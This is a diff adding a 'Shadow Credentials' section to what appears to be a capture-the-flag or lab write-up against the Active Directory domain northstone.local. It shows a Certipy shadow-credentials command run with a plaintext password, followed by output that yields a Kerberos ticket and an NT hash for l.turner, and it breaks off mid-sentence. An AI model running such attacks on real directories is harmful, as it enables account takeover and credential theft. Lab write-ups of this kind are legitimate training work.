@@ -1104,3 +1104,33 @@ But for some reason i cannot get the hash!
 
 So ill try a shadow creds attack
 
+## Shadow Credentials
+
+```python
+certipy-ad shadow auto -u r.parker@northstone.local -p 'Password123!' -account 'l.turner' 
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: NORTHSTONE.LOCAL.
+[!] Use -debug to print a stacktrace
+[*] Targeting user 'l.turner'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'cfe00095444f4680ba9563259a16e39b'
+[*] Adding Key Credential with device ID 'cfe00095444f4680ba9563259a16e39b' to the Key Credentials for 'l.turner'
+[*] Successfully added Key Credential with device ID 'cfe00095444f4680ba9563259a16e39b' to the Key Credentials for 'l.turner'
+[*] Authenticating as 'l.turner' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'l.turner@northstone.local'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'l.turner.ccache'
+[*] Wrote credential cache to 'l.turner.ccache'
+[*] Trying to retrieve NT hash for 'l.turner'
+[*] Restoring the old Key Credentials for 'l.turner'
+[*] Successfully restored the old Key Credentials for 'l.turner'
+[*] NT hash for 'l.turner': 59c717e891bebfce8cab55d4d50751eb
+```
+
+I now have the NR
